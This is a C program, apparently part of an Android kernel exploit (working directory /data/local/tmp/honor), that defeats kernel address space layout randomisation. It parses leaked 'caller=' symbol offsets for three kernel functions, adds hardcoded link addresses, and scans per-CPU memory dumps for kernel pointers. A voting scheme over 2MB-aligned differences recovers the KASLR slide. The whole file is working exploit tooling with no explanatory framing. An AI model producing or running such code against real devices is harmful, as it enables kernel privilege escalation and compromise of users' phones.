#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

struct anchor {
    const char *name;
    uint64_t link;
};

static int compare_u64(const void *a, const void *b) {
    uint64_t x = *(const uint64_t *)a;
    uint64_t y = *(const uint64_t *)b;
    return x < y ? -1 : x > y;
}

int main(int argc, char **argv) {
    const char *dir = argc > 1 ? argv[1] : getenv("HONOR_WORK");
    if (!dir || !*dir) dir = "/data/local/tmp/honor";
    const struct anchor anchors[] = {
        {"worker_thread", 0xffffffc0801352b4ULL},
        {"rcu_gp_fqs_loop", 0xffffffc080295bc0ULL},
        {"rcu_gp_kthread", 0xffffffc0802959fcULL},
    };
    const size_t anchor_count = sizeof(anchors) / sizeof(anchors[0]);
    uint64_t targets[32];
    size_t target_count = 0;
    char path[512];
    snprintf(path, sizeof(path), "%s/bl_text.txt", dir);

    FILE *text = fopen(path, "r");
    if (!text) {
        perror("open bl_text.txt");
        return 2;
    }
    char line[2048];
    while (fgets(line, sizeof(line), text)) {
        const char *caller = strstr(line, "caller=");
        if (!caller) continue;
        caller += 7;
        for (size_t a = 0; a < anchor_count; ++a) {
            size_t n = strlen(anchors[a].name);
            if (strncmp(caller, anchors[a].name, n) != 0 || caller[n] != '+')
                continue;
            const char *off = strstr(caller + n, "+0x");
            if (!off) continue;
            uint64_t target = anchors[a].link + strtoull(off + 3, NULL, 16);
            int found = 0;
            for (size_t i = 0; i < target_count; ++i)
                if (targets[i] == target) found = 1;
            if (!found && target_count < sizeof(targets) / sizeof(targets[0]))
                targets[target_count++] = target;
        }
    }
    fclose(text);
    if (target_count == 0) {
        fprintf(stderr, "no KASLR targets\n");
        return 2;
    }

    size_t candidates_len = 0;
    size_t candidates_cap = 65536;
    uint64_t *candidates = malloc(candidates_cap * sizeof(uint64_t));
    if (!candidates) return 2;
    size_t pointer_count = 0;
    size_t total_bytes = 0;

    for (int cpu = 0; cpu < 8; ++cpu) {
        snprintf(path, sizeof(path), "%s/bl_%d.bin", dir, cpu);
        FILE *fp = fopen(path, "rb");
        if (!fp) continue;
        if (fseek(fp, 0, SEEK_END) != 0) {
            fclose(fp);
            continue;
        }
        long size = ftell(fp);
        rewind(fp);
        if (size <= 0) {
            fclose(fp);
            continue;
        }
        uint8_t *data = malloc((size_t)size);
        if (!data) {
            fclose(fp);
            continue;
        }
        size_t got = fread(data, 1, (size_t)size, fp);
        fclose(fp);
        total_bytes += got;
        for (size_t i = 0; i + 8 <= got; i += 4) {
            uint64_t value;
            memcpy(&value, data + i, sizeof(value));
            if (value < 0xffffff8000000000ULL || value >= 0xfffffff000000000ULL)
                continue;
            ++pointer_count;
            for (size_t t = 0; t < target_count; ++t) {
                if (value < targets[t]) continue;
                uint64_t candidate = value - targets[t];
                if (candidate == 0 || candidate >= (1ULL << 42)) continue;
                if (candidate & 0x1fffffULL) continue;
                if (candidates_len == candidates_cap) {
                    candidates_cap *= 2;
                    uint64_t *grown = realloc(
                            candidates, candidates_cap * sizeof(uint64_t));
                    if (!grown) {
                        free(data);
                        free(candidates);
                        return 2;
                    }
                    candidates = grown;
                }
                candidates[candidates_len++] = candidate;
            }
        }
        free(data);
    }

    if (candidates_len == 0) {
        fprintf(stderr, "no candidate pointers, bytes=%zu\n", total_bytes);
        free(candidates);
        return 2;
    }
    qsort(candidates, candidates_len, sizeof(uint64_t), compare_u64);
    uint64_t best = 0;
    size_t best_count = 0;
    for (size_t i = 0; i < candidates_len;) {
        size_t j = i + 1;
        while (j < candidates_len && candidates[j] == candidates[i]) ++j;
        if (j - i > best_count) {
            best_count = j - i;
            best = candidates[i];
        }
        i = j;
    }
    free(candidates);

    printf("KASLR_BYTES=%zu\n", total_bytes);
    printf("KASLR_ANCHORS=%zu\n", target_count);
    printf("KASLR_POINTERS=%zu\n", pointer_count);
    printf("KASLR_SLIDE=0x%llx\n", (unsigned long long)best);
    printf("KASLR_VOTES=%zu\n", best_count);
    if (best_count < 3) return 2;
    return 0;
}
